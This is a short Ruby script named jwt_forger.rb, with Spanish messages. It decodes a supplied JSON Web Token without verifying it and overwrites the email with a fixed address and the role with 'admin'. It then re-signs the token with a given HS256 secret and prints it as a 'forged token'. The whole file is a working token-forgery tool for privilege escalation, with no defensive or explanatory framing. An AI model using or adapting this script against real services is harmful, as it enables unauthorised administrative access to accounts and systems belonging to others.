require 'jwt'

token_original = ARGV[0]
secret = ARGV[1]

if ARGV.length < 2
  puts "Uso: ruby jwt_forger.rb <token_original> <secreto>"
  exit
end

begin
  payload = JWT.decode(token_original, nil, false)[0]

  payload['email'] = 'm.valencia_sys88@jitter.io'
  payload['role']  = 'admin'
  payload['iat']   = Time.now.to_i

  nuevo_token = JWT.encode(payload, secret, 'HS256', { typ: 'JWT' })

  puts "\e[1;32m[+] TOKEN FORJADO\e[0m"
  puts "\n#{nuevo_token}\n"

rescue => e
  puts "\e[31m[!] Error: #{e.message}\e[0m"
end